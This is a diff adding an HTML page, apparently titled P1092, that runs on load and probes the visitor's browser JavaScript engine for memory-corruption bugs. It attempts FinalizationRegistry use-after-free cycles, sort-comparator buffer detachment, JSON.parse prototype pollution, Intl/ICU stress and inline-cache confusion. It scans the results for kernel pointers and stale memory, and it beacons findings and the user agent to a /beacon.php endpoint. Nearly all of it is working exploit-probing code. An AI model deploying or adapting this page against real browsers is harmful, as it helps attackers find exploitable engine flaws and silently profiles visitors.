@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1092</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.crit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1092 — DEEP GC + TYPE CONFUSION + INTL</div>
+<div class="info">FinalizationRegistry cycle UAF, Array.sort TOCTOU, JSON.parse reviver detach, Intl format exploits, prototype pollution</div>
+</div>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){try{new Image().src='/beacon.php?tag=P1092-'+encodeURIComponent(t)+'&data='+encodeURIComponent(d)+'&_='+Date.now()}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function gcPressure(mb){var g=[];for(var i=0;i<mb;i++)g.push(new ArrayBuffer(1048576));g=null}
+
+// ============================================================
+// SECTION A: FINALIZATIONREGISTRY CYCLE UAF
+// Adapted from QuickJS CVE: register a FinalizationRegistry
+// as held value of itself, creating a cycle. When GC collects,
+// the pending finalization job may reference freed registry.
+// ============================================================
+async function sectionA(){
+  log('warn','=== A: FINALIZATIONREGISTRY CYCLE UAF ===');
+  var anomalies=0;
+
+  // A1: Self-referencing registry
+  for(var round=0;round<20;round++){
+    try{
+      var leaked=[];
+      var reg=new FinalizationRegistry(function(held){
+        // held IS the registry itself — it should be alive
+        // If GC collected the cycle, held is dangling
+        leaked.push(typeof held);
+        try{
+          // Try to use the held registry — if freed, this crashes
+          held.register({dummy:round},'test-inside');
+        }catch(e){
+          anomalies++;
+          B('A1-CRASH','round:'+round+'|err:'+e.message);
+          log('crit','[A1-'+round+'] CRASH using held registry: '+e.message);
+        }
+      });
+      // Register an object with the registry itself as held value
+      var target={id:round};
+      reg.register(target,reg); // held = reg itself
+      target=null; // drop strong ref to trigger finalization
+      reg=null; // drop strong ref to registry too — cycle!
+
+      gcPressure(50);
+      await sl(20);
+    }catch(e){
+      B('A1-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('A1-SELF','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[A1] Self-ref registry: '+anomalies+'/20');
+
+  // A2: Cross-referencing registries
+  for(var round=0;round<15;round++){
+    try{
+      var regA=new FinalizationRegistry(function(held){
+        try{held.register({x:1},'from-A')}catch(e){anomalies++;B('A2-CROSS','round:'+round+'|A-err:'+e.message)}
+      });
+      var regB=new FinalizationRegistry(function(held){
+        try{held.register({x:2},'from-B')}catch(e){anomalies++;B('A2-CROSS','round:'+round+'|B-err:'+e.message)}
+      });
+      // Cross-register: A holds B, B holds A
+      var t1={a:1},t2={b:2};
+      regA.register(t1,regB);
+      regB.register(t2,regA);
+      t1=null;t2=null;regA=null;regB=null;
+      gcPressure(80);
+      await sl(30);
+    }catch(e){
+      B('A2-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('A2-CROSS-DONE','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[A2] Cross-ref registries: '+anomalies+'/15');
+
+  // A3: Registry that resurrects its target
+  for(var round=0;round<15;round++){
+    try{
+      var resurrected=null;
+      var weakRef=null;
+      var reg=new FinalizationRegistry(function(held){
+        // Resurrect: store the held value globally
+        resurrected=held;
+      });
+      var bigBuf=new ArrayBuffer(1024*1024);
+      var view=new BigUint64Array(bigBuf);
+      view[0]=0xDEADCAFEBEEFn;
+      weakRef=new WeakRef(bigBuf);
+      reg.register(bigBuf,bigBuf); // held = target itself
+      bigBuf=null;
+      gcPressure(100);
+      await sl(50);
+
+      if(resurrected){
+        // The callback fired and resurrected the buffer
+        try{
+          var v2=new BigUint64Array(resurrected);
+          var val=v2[0];
+          if(val!==0xDEADCAFEBEEFn&&val!==0n){
+            anomalies++;
+            B('A3-STALE','round:'+round+'|val:0x'+val.toString(16));
+            log('crit','[A3-'+round+'] STALE data in resurrected buffer: 0x'+val.toString(16));
+          }else{
+            B('A3-RESURRECTED','round:'+round+'|val:0x'+val.toString(16)+'|len:'+resurrected.byteLength);
+          }
+        }catch(e){
+          anomalies++;
+          B('A3-DETACHED','round:'+round+'|'+e.message);
+          log('crit','[A3-'+round+'] Resurrected buffer DETACHED: '+e.message);
+        }
+      }
+    }catch(e){
+      B('A3-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('A3-RESURRECT','anomalies:'+anomalies);
+
+  B('A-DONE','total:'+anomalies);
+  log(anomalies>0?'crit':'ok','[A] FinalizationRegistry total: '+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION B: ARRAY.SORT EVIL COMPARATOR
+// Sort comparator that modifies the array during sorting —
+// detach backing store, change length, splice elements.
+// Classic TOCTOU in sort implementations.
+// ============================================================
+async function sectionB(){
+  log('warn','=== B: ARRAY.SORT EVIL COMPARATOR ===');
+  var anomalies=0;
+
+  // B1: Sort + detach TypedArray
+  for(var round=0;round<30;round++){
+    try{
+      var buf=new ArrayBuffer(256);
+      var arr=new Float64Array(buf);
+      for(var i=0;i<arr.length;i++)arr[i]=arr.length-i;
+      var sortCalls=0;
+
+      try{
+        arr.sort(function(a,b){
+          sortCalls++;
+          if(sortCalls===5){
+            try{structuredClone(buf,{transfer:[buf]})}catch(e){}
+          }
+          return a-b;
+        });
+        // If sort continued after detach, check for stale values
+        var u64=new BigUint64Array(arr.buffer);
+        for(var i=0;i<u64.length;i++){
+          var hi=Number(u64[i]>>32n);
+          if(hi>=0xFFFF8000){
+            anomalies++;
+            B('B1-KPTR','round:'+round+'|idx:'+i+'|val:0x'+u64[i].toString(16));
+            log('crit','[B1-'+round+'] KERNEL PTR in sorted array!');
+          }
+        }
+      }catch(e){/* expected - detached buffer */}
+    }catch(e){
+      B('B1-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('B1-SORT-DETACH','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[B1] Sort+detach: '+anomalies+'/30');
+
+  // B2: Sort + length shrink via proxy
+  for(var round=0;round<30;round++){
+    try{
+      var arr=Array.from({length:100},function(_,i){return i});
+      var sortCalls=0;
+
+      arr.sort(function(a,b){
+        sortCalls++;
+        if(sortCalls===20){
+          // Shrink array mid-sort
+          arr.length=5;
+          // Spray new objects into freed slots
+          for(var i=0;i<100;i++)arr.push({toString:function(){return'INJECTED'}});
+        }
+        return a-b;
+      });
+
+      // Check if we got injected objects mixed into "sorted" part
+      for(var i=0;i<Math.min(arr.length,10);i++){
+        if(typeof arr[i]==='object'){
+          anomalies++;
+          B('B2-INJECT','round:'+round+'|idx:'+i+'|val:'+String(arr[i]));
+          log('crit','[B2-'+round+'] INJECTED object at idx '+i);
+        }
+      }
+    }catch(e){
+      B('B2-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('B2-SORT-SHRINK','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[B2] Sort+shrink: '+anomalies+'/30');
+
+  // B3: Sort comparator that deletes and re-adds prototype properties
+  for(var round=0;round<20;round++){
+    try{
+      var arr=[9,1,8,2,7,3,6,4,5,0];
+      var sortCalls=0;
+
+      arr.sort(function(a,b){
+        sortCalls++;
+        if(sortCalls===3){
+          // Add a getter on Array.prototype during sort
+          Object.defineProperty(Array.prototype,round+'',{
+            get:function(){return{valueOf:function(){return 0xBEEF}}},
+            configurable:true
+          });
+        }
+        return a-b;
+      });
+      // Clean up
+      delete Array.prototype[round+''];
+    }catch(e){
+      B('B3-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('B3-PROTO','tested');
+  log('ok','[B3] Sort+proto pollution: tested');
+
+  B('B-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION C: JSON.PARSE REVIVER DETACH
+// The reviver function runs for each parsed value.
+// If it detaches an AB during parse, later values might
+// reference freed backing store.
+// ============================================================
+async function sectionC(){
+  log('warn','=== C: JSON.PARSE REVIVER ATTACKS ===');
+  var anomalies=0;
+
+  // C1: Reviver that triggers GC + allocations
+  for(var round=0;round<20;round++){
+    try{
+      var bigJSON='{"a":1,"b":2,"c":3,"d":4,"e":5,"nested":{"x":1,"y":2,"arr":[1,2,3,4,5,6,7,8,9,10]}}';
+      var reviverCalls=0;
+      var staleRefs=[];
+
+      var parsed=JSON.parse(bigJSON,function(key,value){
+        reviverCalls++;
+        if(reviverCalls===5){
+          // Heavy allocation during parse
+          gcPressure(20);
+          // Also modify this object
+          if(typeof this==='object'&&this!==null){
+            try{this.__injected__=new ArrayBuffer(4096)}catch(e){}
+          }
+        }
+        return value;
+      });
+
+      // Check if parsed object has corruption
+      if(parsed&&parsed.nested){
+        if(parsed.nested.x!==1||parsed.nested.y!==2){
+          anomalies++;
+          B('C1-CORRUPT','round:'+round+'|x:'+parsed.nested.x+'|y:'+parsed.nested.y);
+          log('crit','[C1-'+round+'] CORRUPT parsed: x='+parsed.nested.x+' y='+parsed.nested.y);
+        }
+      }
+    }catch(e){
+      B('C1-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('C1-REVIVER','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[C1] JSON reviver+GC: '+anomalies+'/20');
+
+  // C2: Reviver + prototype pollution combo
+  for(var round=0;round<20;round++){
+    try{
+      var saved=Object.prototype.constructor;
+      JSON.parse('{"__proto__":{"polluted":"yes"},"a":1}',function(key,value){
+        if(key==='__proto__'&&typeof value==='object'){
+          // Attempt to pollute Object prototype via JSON parse
+          try{Object.assign(Object.prototype,value)}catch(e){}
+        }
+        return value;
+      });
+
+      if(({}).polluted==='yes'){
+        anomalies++;
+        B('C2-PROTO-POLLUTED','round:'+round);
+        log('crit','[C2-'+round+'] PROTOTYPE POLLUTED via JSON.parse!');
+      }
+      // Clean up
+      try{delete Object.prototype.polluted}catch(e){}
+    }catch(e){
+      B('C2-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('C2-PROTO','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[C2] JSON proto pollution: '+anomalies+'/20');
+
+  // C3: Reviver that returns a Proxy for type confusion
+  for(var round=0;round<20;round++){
+    try{
+      var typeConfused=false;
+      var parsed=JSON.parse('{"a":1,"b":"hello","c":[1,2,3]}',function(key,value){
+        if(key==='a'){
+          // Return a Proxy that pretends to be a number but is really an object
+          return new Proxy({},{
+            get:function(t,p){
+              if(p===Symbol.toPrimitive)return function(hint){
+                if(hint==='number')return 42;
+                if(hint==='string')return 'not-a-number';
+                return true;
+              };
+              if(p==='constructor')return Number;
+              return t[p];
+            }
+          });
+        }
+        return value;
+      });
+
+      // Check if engine treats our proxy as a number
+      if(typeof parsed.a==='object'&&parsed.a+0===42){
+        B('C3-TYPE-CONFUSED','round:'+round+'|typeof:'+typeof parsed.a+'|add:'+String(parsed.a+0));
+        // This is interesting but not necessarily exploitable
+      }
+    }catch(e){
+      B('C3-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('C3-TYPE','tested');
+  log('ok','[C3] JSON reviver type confusion: tested');
+
+  B('C-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION D: INTL API EXPLOITATION
+// Intl.NumberFormat, Intl.DateTimeFormat etc. use ICU library.
+// ICU has had many buffer overflow/heap corruption bugs.
+// ============================================================
+async function sectionD(){
+  log('warn','=== D: INTL API EXPLOITATION ===');
+  var anomalies=0;
+
+  // D1: Check Intl availability
+  var hasIntl=typeof Intl!=='undefined';
+  B('D1-AVAIL','Intl:'+hasIntl);
+  if(!hasIntl){log('fail','[D] No Intl API');return 0}
+
+  // D2: Extreme locale strings
+  var locales=['en-US','ja-JP','zh-Hans-CN','ar-SA','he-IL',
+    'en-u-nu-fullwide','en-u-ca-persian-nu-arab',
+    'und-Cyrl-RU','en-x-'+'a'.repeat(200),
+    'en-u-'+'ab-'.repeat(50)+'true'];
+
+  for(var i=0;i<locales.length;i++){
+    try{
+      var nf=new Intl.NumberFormat(locales[i]);
+      var result=nf.format(123456789.123);
+      if(result.length>100){
+        B('D2-LONG','locale:'+locales[i].substring(0,30)+'|len:'+result.length);
+        log('warn','[D2] Long format result: '+result.length+' chars for locale '+locales[i].substring(0,30));
+      }
+    }catch(e){}
+  }
+  B('D2-LOCALES','tested:'+locales.length);
+  log('ok','[D2] Locale stress: tested '+locales.length);
+
+  // D3: formatToParts with extreme values
+  try{
+    var extremes=[Number.MAX_VALUE,Number.MIN_VALUE,-0,Infinity,-Infinity,NaN,
+      Number.MAX_SAFE_INTEGER,Number.MAX_SAFE_INTEGER+1,
+      1e308,1e-308,5e-324];
+    var nf=new Intl.NumberFormat('en-US',{style:'currency',currency:'USD',
+      minimumFractionDigits:20,maximumFractionDigits:20});
+
+    for(var i=0;i<extremes.length;i++){
+      try{
+        var parts=nf.formatToParts(extremes[i]);
+        var totalLen=0;
+        for(var j=0;j<parts.length;j++)totalLen+=parts[j].value.length;
+        if(totalLen>500){
+          B('D3-HUGE','val:'+extremes[i]+'|parts:'+parts.length+'|len:'+totalLen);
+          log('warn','[D3] Huge format: '+totalLen+' chars for '+extremes[i]);
+        }
+      }catch(e){}
+    }
+    B('D3-EXTREME','tested:'+extremes.length);
+    log('ok','[D3] Extreme values: tested '+extremes.length);
+  }catch(e){
+    B('D3-ERR',e.message);
+  }
+
+  // D4: Intl.Segmenter (if available) — ICU segmentation bugs
+  try{
+    if(typeof Intl.Segmenter!=='undefined'){
+      var seg=new Intl.Segmenter('en',{granularity:'grapheme'});
+      // Emoji sequences that stress the segmenter
+      var stressStrings=[
+        '👨‍👩‍👧‍👦', // family emoji
+        'क्षि', // Devanagari cluster
+        '🏴󠁧󠁢󠁳󠁣󠁴󠁿', // flag tag
+        'À́̂̃̄̅̆̇̈̉̊̋̌̍', // combining
+      ];
+      // Repeat to stress
+      for(var i=0;i<stressStrings.length;i++){
+        var bigStr=stressStrings[i].repeat(1000);
+        var segments=seg.segment(bigStr);
+        var count=0;
+        for(var s of segments){count++;if(count>50000)break}
+        B('D4-SEG','str:'+i+'|segs:'+count);
+      }
+      log('info','[D4] Segmenter: tested '+stressStrings.length+' stress strings');
+    }else{
+      B('D4-NOSEG','Segmenter:undefined');
+      log('info','[D4] No Intl.Segmenter');
+    }
+  }catch(e){
+    B('D4-ERR',e.message);
+  }
+
+  // D5: Intl.ListFormat / Intl.RelativeTimeFormat (if available)
+  try{
+    if(typeof Intl.ListFormat!=='undefined'){
+      var lf=new Intl.ListFormat('en',{style:'long',type:'conjunction'});
+      // Giant list
+      var bigList=[];
+      for(var i=0;i<10000;i++)bigList.push('item'+i);
+      var result=lf.format(bigList);
+      B('D5-LIST','len:'+result.length);
+      log('info','[D5] ListFormat 10K items: '+result.length+' chars');
+    }
+  }catch(e){
+    B('D5-ERR',e.message);
+  }
+
+  try{
+    if(typeof Intl.RelativeTimeFormat!=='undefined'){
+      var rtf=new Intl.RelativeTimeFormat('en');
+      var extremeTimes=[1e15,-1e15,Infinity,-Infinity,NaN,Number.MAX_SAFE_INTEGER];
+      for(var i=0;i<extremeTimes.length;i++){
+        try{
+          var r=rtf.format(extremeTimes[i],'second');
+          B('D5-RTF','val:'+extremeTimes[i]+'|out:'+r.substring(0,50));
+        }catch(e){}
+      }
+    }
+  }catch(e){}
+
+  B('D-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION E: OBJECT SHAPE TRANSITION CONFUSION
+// JSC uses "Structures" (hidden classes) to track object shapes.
+// Rapid shape transitions + GC can confuse the inline cache.
+// ============================================================
+async function sectionE(){
+  log('warn','=== E: STRUCTURE TRANSITION CONFUSION ===');
+  var anomalies=0;
+
+  // E1: Rapid shape transitions with delete
+  try{
+    for(var round=0;round<20;round++){
+      var arr=[];
+      for(var i=0;i<1000;i++){
+        var obj={};
+        // Add properties in alternating orders to create many structures
+        if(i%2===0){obj.a=1;obj.b=2;obj.c=3}
+        else{obj.c=3;obj.b=2;obj.a=1}
+        // Delete and re-add to force transition
+        if(i%3===0){delete obj.b;obj.b=42}
+        arr.push(obj);
+      }
+      // Now access all objects — inline cache should be confused
+      var sum=0;
+      for(var i=0;i<arr.length;i++){
+        sum+=arr[i].a+arr[i].b+arr[i].c;
+      }
+      // Expected: 1+2+3=6 for even, 3+2+1=6 for odd, 1+42+3=46 for i%3===0 overlap
+      // If structure confusion corrupts, sum will be wrong
+      if(isNaN(sum)){
+        anomalies++;
+        B('E1-NAN','round:'+round);
+        log('crit','[E1-'+round+'] NaN sum — structure confusion!');
+      }
+    }
+    B('E1-SHAPE','anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok','[E1] Shape transitions: '+anomalies+'/20');
+  }catch(e){
+    B('E1-ERR',e.message);
+  }
+
+  // E2: Prototype chain mutation during property access
+  try{
+    for(var round=0;round<20;round++){
+      var base={x:1};
+      var mid=Object.create(base);
+      mid.y=2;
+      var leaf=Object.create(mid);
+      leaf.z=3;
+
+      // Access to warm the cache
+      for(var i=0;i<100;i++){
+        var v=leaf.x+leaf.y+leaf.z; // should be 6
+      }
+
+      // Mutate prototype chain
+      Object.setPrototypeOf(mid,{x:999,w:888});
+
+      // Access again — should pick up new prototype
+      var after=leaf.x+leaf.y+leaf.z;
+      if(after!==999+2+3){
+        if(after===1+2+3){
+          // Stale inline cache — using old prototype value
+          anomalies++;
+          B('E2-STALE','round:'+round+'|after:'+after);
+          log('crit','[E2-'+round+'] STALE prototype cache! got '+after+' expected 1004');
+        }
+      }
+    }
+    B('E2-PROTO-CHAIN','anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok','[E2] Proto chain mutation: '+anomalies+'/20');
+  }catch(e){
+    B('E2-ERR',e.message);
+  }
+
+  // E3: defineProperty during for-in enumeration
+  try{
+    for(var round=0;round<20;round++){
+      var obj={a:1,b:2,c:3,d:4,e:5};
+      var keys=[];
+      var addedDuring=false;
+
+      for(var key in obj){
+        keys.push(key);
+        if(key==='c'&&!addedDuring){
+          addedDuring=true;
+          // Add new property during enumeration
+          Object.defineProperty(obj,'INJECTED_'+round,{
+            value:0xDEAD,
+            enumerable:true,
+            configurable:true
+          });
+          // Delete an upcoming property
+          delete obj.e;
+        }
+      }
+
+      // Check if enumeration order was corrupted
+      var uniqueKeys=keys.filter(function(v,i,a){return a.indexOf(v)===i});
+      if(uniqueKeys.length!==keys.length){
+        anomalies++;
+        B('E3-DUP','round:'+round+'|keys:'+keys.join(','));
+        log('crit','[E3-'+round+'] DUPLICATE keys: '+keys.join(','));
+      }
+    }
+    B('E3-FORIN','anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok','[E3] for-in mutation: '+anomalies+'/20');
+  }catch(e){
+    B('E3-ERR',e.message);
+  }
+
+  B('E-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// SECTION F: STRUCTUREDCLONE EDGE CASES
+// structuredClone handles complex object graphs.
+// Circular refs, shared refs, transferables + non-transferables.
+// ============================================================
+async function sectionF(){
+  log('warn','=== F: STRUCTUREDCLONE EDGE CASES ===');
+  var anomalies=0;
+
+  // F1: Clone object with getter that modifies during clone
+  for(var round=0;round<15;round++){
+    try{
+      var cloneDepth=0;
+      var obj={
+        normal:42,
+        get evil(){
+          cloneDepth++;
+          if(cloneDepth===1){
+            // During clone, modify the object being cloned
+            this.normal=999;
+            this.extra=new ArrayBuffer(4096);
+          }
+          return cloneDepth;
+        }
+      };
+      var cloned=structuredClone(obj);
+      if(cloned.normal===999){
+        B('F1-MID-CLONE','round:'+round+'|normal:'+cloned.normal);
+        log('warn','[F1-'+round+'] Clone saw mid-clone modification');
+      }
+    }catch(e){/* DataCloneError expected for getters */}
+  }
+  B('F1-GETTER','tested');
+  log('ok','[F1] Clone+getter mutation: tested');
+
+  // F2: Transfer + clone the same buffer
+  for(var round=0;round<20;round++){
+    try{
+      var buf=new ArrayBuffer(1024);
+      var view=new BigUint64Array(buf);
+      view[0]=BigInt('0xCAFEBABEDEADBEEF');
+
+      // Try to both transfer AND have it referenced in the clone
+      var obj={ref:new Uint8Array(buf),data:'hello'};
+      try{
+        var cloned=structuredClone(obj,{transfer:[buf]});
+        // buf should be detached, but cloned.ref should have the data
+        if(buf.byteLength!==0){
+          anomalies++;
+          B('F2-NOT-DETACHED','round:'+round+'|len:'+buf.byteLength);
+          log('crit','[F2-'+round+'] Buffer NOT detached after transfer!');
+        }
+        // Check if cloned ref has our data
+        var cv=new BigUint64Array(cloned.ref.buffer);
+        if(cv[0]!==BigInt('0xCAFEBABEDEADBEEF')&&cv[0]!==0n){
+          B('F2-STALE','round:'+round+'|val:0x'+cv[0].toString(16));
+          log('warn','[F2-'+round+'] Unexpected clone value');
+        }
+      }catch(e){/* DataCloneError expected when same buffer is both ref'd and transferred */}
+    }catch(e){
+      B('F2-ERR','round:'+round+'|'+e.message);
+    }
+  }
+  B('F2-TRANSFER','anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok','[F2] Transfer+ref same buffer: '+anomalies+'/20');
+
+  // F3: Deep circular reference + WeakRef interaction
+  try{
+    var reg=new FinalizationRegistry(function(held){
+      B('F3-FINALIZED','held:'+held);
+    });
+
+    for(var round=0;round<10;round++){
+      var a={name:'a'};
+      var b={name:'b',ref_a:a};
+      a.ref_b=b;
+      // Create WeakRefs to both
+      var wa=new WeakRef(a);
+      var wb=new WeakRef(b);
+      reg.register(a,'obj-a-'+round);
+      reg.register(b,'obj-b-'+round);
+
+      // Clone the circular structure
+      try{
+        var cloned=structuredClone(a);
+        // Verify circular ref is preserved
+        if(cloned.ref_b.ref_a!==cloned){
+          B('F3-BROKEN','round:'+round);
+          log('warn','[F3-'+round+'] Circular ref broken in clone');
+        }
+      }catch(e){}
+
+      // Drop originals
+      a=null;b=null;
+    }
+    gcPressure(50);
+    await sl(100);
+    B('F3-CIRCULAR','tested');
+    log('ok','[F3] Circular clone+WeakRef+FinReg: tested');
+  }catch(e){
+    B('F3-ERR',e.message);
+  }
+
+  B('F-DONE','total:'+anomalies);
+  return anomalies;
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run(){
+  B('BOOT',navigator.userAgent.substring(0,80));
+  log('ok','=== P1092: DEEP GC + TYPE CONFUSION + INTL ===');
+  log('info','FinReg cycle, sort TOCTOU, JSON reviver, Intl ICU, structure confusion, structuredClone');
+  log('ok','');
+
+  var total=0;
+  total+=await sectionA();log('ok','');await sl(100);
+  total+=await sectionB();log('ok','');await sl(100);
+  total+=await sectionC();log('ok','');await sl(100);
+  total+=await sectionD();log('ok','');await sl(100);
+  total+=await sectionE();log('ok','');await sl(100);
+  total+=await sectionF();
+
+  log('ok','');
+  B('ALL-DONE','sections:6|total:'+total);
+  log(total>0?'crit':'ok','=== P1092 COMPLETE: '+total+' anomalies ===');
+}
+run();
+</script>
+</body>
+</html>
